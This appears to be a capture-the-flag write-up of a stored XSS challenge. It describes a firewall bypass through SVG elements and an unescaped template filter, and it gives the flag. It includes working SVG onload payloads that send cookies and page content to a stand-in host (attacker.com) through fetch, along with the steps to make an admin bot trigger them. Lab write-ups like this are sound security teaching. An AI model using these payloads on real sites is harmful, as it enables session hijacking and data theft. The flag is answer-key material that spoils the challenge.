# Notes

## Overview
The application contains a stored Cross-Site Scripting (XSS) vulnerability in the comment system. While there is a WAF (Web Application Firewall) in place, it has a critical bypass that allows SVG elements containing JavaScript to be executed.

## Vulnerability Details
1. **Location**: The vulnerability exists in the `/add_comment` endpoint in `app.py`
2. **Root Cause**: 
   - The WAF blocks `<script>` tags but allows SVG elements
   - The sanitization only removes script tags but leaves other dangerous elements
   - The `|safe` filter in templates renders the content without HTML escaping

## Exploitation Steps

1. **Craft malicious SVG payload**:
   ```html
   <svg onload="alert('XSS')">
   ```
   Or to steal cookies:
   ```html
   <svg onload="fetch('https://attacker.com/steal?cookie='+document.cookie)">
   ```

2. **Submit as a comment**:
   - Log in or post as anonymous
   - Submit the SVG payload in the comment form

3. **Admin viewing triggers the exploit**:
   - Report the malicious comment
   - When admin views the reported comment (either manually or via the admin bot), the XSS payload executes in their context
   - For the flag, we can target the `/admin/bot` endpoint which reveals the flag

## Full Exploit to Get Flag

1. Create a comment with this payload:
   ```html
   <svg onload="fetch('https://attacker.com/steal?flag='+document.querySelector('.alert').innerText)">
   ```
You can use webhook.site.

2. Report the comment to make it appear in the admin panel

3. When the admin bot or admin user views the comment, the payload will:
   - Extract the flag from the alert div
   - Send it to the attacker's server

### 🔥 **Flag:**  
```
CSP{XS5_15_ST1LL_D4NG3R0U5_1N_2025}
```
